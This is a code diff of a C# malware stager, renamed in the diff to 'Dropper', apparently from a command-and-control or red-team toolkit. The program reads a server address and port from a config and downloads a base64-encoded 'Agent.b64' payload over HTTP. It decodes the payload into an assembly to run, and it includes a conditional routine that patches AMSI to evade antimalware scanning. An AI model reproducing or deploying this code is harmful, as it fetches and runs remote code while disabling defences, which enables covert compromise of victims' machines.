@@ -8,20 +8,19 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace Stager
+namespace Dropper
 {
     class Program
     {
         static void Main(string[] args)
         {
-            IntPtr whdl = GetConsoleWindow();
-            _ = ShowWindow(whdl, 0);
+            //IntPtr whdl = GetConsoleWindow();
+            //_ = ShowWindow(whdl, 0);
 
-            string protocol = Config.Protocol;
-            string server = Config.Server;
-            int port = Config.Port;
-            string file = Config.FileName;
-            string agentparams = Config.AgentParams;
+            string protocol = Config.Potocol.Trim();
+            string server = Config.Address.Trim();
+            int port = int.Parse(Config.Port.Trim());
+            string agentparams = $"{protocol}:{server}:{port}";
 
             HttpClient client = new HttpClient();
             client.Timeout = new TimeSpan(0, 0, 10);
@@ -32,7 +31,7 @@ namespace Stager
             PatchAMSI();
 #endif
 
-            var b64 = client.GetStringAsync($"/{file}").Result;
+            var b64 = client.GetStringAsync($"Agent.b64").Result;
 
             var asm = Convert.FromBase64String(b64);
 
@@ -58,6 +57,7 @@ namespace Stager
                 var output = Encoding.UTF8.GetString(ms.ToArray());
             }
         }
+        
 
 #if PATCHAMSI
         static string dec(string enc)
@@ -116,7 +116,7 @@ namespace Stager
 #endif
 
         [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
+        static extern IntPtr GetConsoleWindow(); 
 
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
